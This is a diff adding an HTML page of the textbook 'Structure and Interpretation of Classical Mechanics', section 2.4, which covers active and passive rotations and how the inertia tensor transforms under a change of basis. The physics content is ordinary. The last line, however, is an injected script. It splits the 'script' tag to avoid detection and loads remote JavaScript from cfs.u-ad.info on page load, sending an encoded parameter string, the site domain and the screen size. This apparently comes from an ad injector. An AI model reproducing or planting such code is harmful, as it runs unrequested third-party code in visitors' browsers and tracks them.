@@ -1,0 +1,125 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-23.html">previous</a></span><span>, <a href="book-Z-H-25.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.4"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.4">2.4&nbsp;&nbsp;Inertia Tensor</a></h2>
+<p>
+<a name="%_idx_1122"></a></p>
+<p>
+The representation of the rotational kinetic energy in terms of the
+inertia tensor was derived with the help of a rectangular coordinate
+system with basis vectors <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>.  There was nothing special
+about this particular rectangular basis.  So, the kinetic energy must
+have the same form in any rectangular coordinate system.  We can use
+this fact to derive how the inertia tensor changes if the body or the
+coordinate system is rotated.</p>
+<p>
+<a name="%_idx_1124"></a><a name="%_idx_1126"></a>Let's talk a bit about <em>active</em> and <em>passive</em> rotations.
+The rotation of the vector <img src="chap1-Z-G-D-26.gif" border="0"> by the rotation <em>R</em> produces a
+new vector <img src="chap1-Z-G-D-26.gif" border="0">'  =  <em>R</em> <img src="chap1-Z-G-D-26.gif" border="0">.  We may write <img src="chap1-Z-G-D-26.gif" border="0"> in terms of
+its components with respect to some arbitrary rectangular coordinate
+system with orthonormal basis vectors <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>: <img src="chap1-Z-G-D-26.gif" border="0">  =  <em>x</em><sup>0</sup>
+<img src="chap2-Z-G-D-9.gif" border="0"><sub>0</sub>  +  <em>x</em><sup>1</sup> <img src="chap2-Z-G-D-9.gif" border="0"><sub>1</sub>  +  <em>x</em><sup>2</sup> <img src="chap2-Z-G-D-9.gif" border="0"><sub>2</sub>.  Let <strong><em>x</em></strong> indicate
+the column matrix of components <em>x</em><sup>0</sup>, <em>x</em><sup>1</sup>, and <em>x</em><sup>2</sup> of <img src="chap1-Z-G-D-26.gif" border="0">,
+and <strong><em>R</em></strong> be the matrix representation of <em>R</em> with respect to the
+same basis.  In these terms the rotation can be written <strong><em>x</em></strong>'  =  <strong><em>R</em></strong> <strong><em>x</em></strong>.  The rotation matrix <strong><em>R</em></strong> is a real orthogonal
+matrix.<a name="call_footnote_Temp_182" href="#footnote_Temp_182"><sup><small>4</small></sup></a>
+A rotation that carries vectors to new vectors is called an <em>active</em> rotation.</p>
+<p>
+Alternately, we can rotate the coordinate system by rotating the basis
+vectors, but leave other vectors that might be represented in terms of
+them unchanged.  If a vector is unchanged but the basis vectors are
+rotated, then the components of the vector on the rotated basis vectors
+are not the same as the components on the original basis vectors.
+Denote the rotated basis vectors by <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>'  =  <em>R</em> <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>.  The
+component of a vector along a basis vector is the dot product of the
+vector with the basis vector.  So the components of the vector
+<img src="chap1-Z-G-D-26.gif" border="0"> along the rotated basis <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>' are (<em>x</em>')<sup><em>i</em></sup>  =  <img src="chap1-Z-G-D-26.gif" border="0">
+ &middot;  <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>'  =  <img src="chap1-Z-G-D-26.gif" border="0">  &middot;  (<em>R</em> <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>)  =  (<em>R</em><sup><tt>-</tt>1</sup> <img src="chap1-Z-G-D-26.gif" border="0">)
+ &middot;  <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>.<a name="call_footnote_Temp_183" href="#footnote_Temp_183"><sup><small>5</small></sup></a>
+Thus the components with
+respect to the rotated basis elements are the same as the components
+of the rotated vector <em>R</em><sup><tt>-</tt>1</sup> <img src="chap1-Z-G-D-26.gif" border="0"> with respect to the original
+basis.  In terms of components, if the vector <img src="chap1-Z-G-D-26.gif" border="0"> has components
+<strong><em>x</em></strong> with respect to the original basis vectors <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>, then
+the components <strong><em>x</em></strong>' of the same vector with respect to the
+rotated basis vectors <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>' are <strong><em>x</em></strong>'  =  <strong><em>R</em></strong><sup><tt>-</tt>1</sup> <strong><em>x</em></strong>, or equivalently <strong><em>x</em></strong>  =  <strong><em>R</em></strong> <strong><em>x</em></strong>'.  A rotation that
+actively rotates the basis vectors, leaving other vectors unchanged, is
+called a <em>passive</em> rotation.  For a passive rotation the
+components of a fixed vector change as if the vector was actively
+rotated by the inverse rotation.</p>
+<p>
+<a name="%_idx_1132"></a><a name="%_idx_1134"></a><a name="%_idx_1136"></a>With respect to the rectangular basis <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub> the rotational
+kinetic energy is written
+<a name="EQUATION_2.19"></a></p>
+<div align=left><img src="chap2-Z-G-20.gif" border="0"></div>
+<p>
+In terms of matrix representations, the kinetic energy is
+<a name="EQUATION_2.20"></a></p>
+<div align=left><img src="chap2-Z-G-21.gif" border="0"></div>
+<p>
+where  <img src="chap1-Z-G-D-23.gif" border="0"> is the column of components representing
+<img src="chap2-Z-G-D-8.gif" border="0">.<a name="call_footnote_Temp_184" href="#footnote_Temp_184"><sup><small>6</small></sup></a>
+If we rotate the coordinate system by the passive
+rotation <em>R</em> about the center of rotation, the new basis vectors are
+<img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>'  =  <em>R</em> <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>.  The components  <img src="chap1-Z-G-D-23.gif" border="0">' of the vector
+<img src="chap2-Z-G-D-8.gif" border="0"> with respect to the rotated coordinate system satisfy
+<a name="EQUATION_2.21"></a></p>
+<div align=left><img src="chap2-Z-G-22.gif" border="0"></div>
+<p>
+where <strong><em>R</em></strong> is the matrix representation of <em>R</em>.
+The kinetic energy is
+<a name="EQUATION_2.22"></a></p>
+<div align=left><img src="chap2-Z-G-23.gif" border="0"></div>
+<p>
+However, if we had started with the basis <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>', we would have
+written the kinetic energy directly as
+<a name="EQUATION_2.23"></a></p>
+<div align=left><img src="chap2-Z-G-24.gif" border="0"></div>
+<p>
+where the components are taken with respect to the <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>' basis.
+Comparing the two expressions, we see that 
+<a name="EQUATION_2.24"></a></p>
+<div align=left><img src="chap2-Z-G-25.gif" border="0"></div>
+<p>
+Thus the inertia matrix transforms by a similarity
+transformation.<a name="call_footnote_Temp_185" href="#footnote_Temp_185"><sup><small>7</small></sup></a></p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_182" href="#call_footnote_Temp_182"><sup><small>4</small></sup></a> An <a name="%_idx_1128"></a><a name="%_idx_1130"></a>orthogonal matrix <strong><em>R</em></strong> satisfies <strong><em>R</em></strong><sup><tt><em>T</em></tt></sup>  = 
+<strong><em>R</em></strong><sup><tt>-</tt>1</sup> and det <strong><em>R</em></strong>  =  1.</p>
+
+<p><a name="footnote_Temp_183" href="#call_footnote_Temp_183"><sup><small>5</small></sup></a> The last equality follows from the fact
+that the rotation of two vectors preserves the dot product: <img src="chap1-Z-G-D-26.gif" border="0">
+ &middot;  <img src="chap2-Z-G-D-12.gif" border="0">  =  (<em>R</em><img src="chap1-Z-G-D-26.gif" border="0">)  &middot;  (<em>R</em><img src="chap2-Z-G-D-12.gif" border="0">), or (<em>R</em><sup><tt>-</tt>1</sup> <img src="chap1-Z-G-D-26.gif" border="0">)
+ &middot;  <img src="chap2-Z-G-D-12.gif" border="0">  =  <img src="chap1-Z-G-D-26.gif" border="0">  &middot;  (<em>R</em> <img src="chap2-Z-G-D-12.gif" border="0">).</p>
+
+<p><a name="footnote_Temp_184" href="#call_footnote_Temp_184"><sup><small>6</small></sup></a> We take a 1-by-1 matrix as a number.</p>
+
+<p><a name="footnote_Temp_185" href="#call_footnote_Temp_185"><sup><small>7</small></sup></a> That the inertia tensor transforms in this
+manner could have been deduced from its
+definition&nbsp;(<a href="book-Z-H-23.html#EQUATION_2.14">2.14</a>).  However, it seems that the
+argument based on the coordinate-system independence of the 
+kinetic energy provides insight.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-23.html">previous</a></span><span>, <a href="book-Z-H-25.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2reRZVKg96QcMZ2bTPDFtEVkXVlFwzrNsbQwOS9Lq7yE24a6wZvzTIVJTAL4B1f9HTXVLFZ4Qe1jZTWJ9q3On%2fPC6VQKcUqoeAbzTvVmsBNyNo8mC1c7GJ69TQj9hmJxEjGm07Muz7qg027DfJSaZvrT7FQQ3WFrwxcL%2bnJGROD8g6xLYgYzsBYV2fCSb1ciaUB4Ga%2bcoM32a4UlCPhk2m4%2bd2pibR9cMU8ocTt1lMLpkGuzaDgNKi5pkc%2bhjgSDi83EcrY%2baPd%2fM7C4DtvWBmcPF61tn7dY%2fXROv3RVrC0hzd%2f%2bTxArmVxtnGY8lZ%2bFM%2fFd4TLj%2fLMWelMkLIl6dF3nXEWJR7iSLugsKI%2bau2BwcxMkMuzVtPrRdZ%2fMEV6sweurh12teOg3%2bOQ7SKBea8KcAA3IorcXoMUOvpLClSKOX1IR3kb%2btWhqeX2bw%2feqhGpyctWxu3LtnWbz7nKH33");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
